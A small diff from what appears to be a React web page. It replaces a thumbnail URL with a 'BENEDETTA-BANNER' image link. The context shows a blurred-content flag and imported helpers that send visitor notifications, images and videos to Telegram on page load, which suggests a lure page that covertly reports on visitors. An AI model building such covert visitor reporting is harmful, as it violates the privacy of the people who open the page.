@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://id.pinterest.com/pin/604678687507199748/';
+  const thumbnailUrl = 'https://i.ibb.co.com/zhpZMc9F/BENEDETTA-BANNER.jpg';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
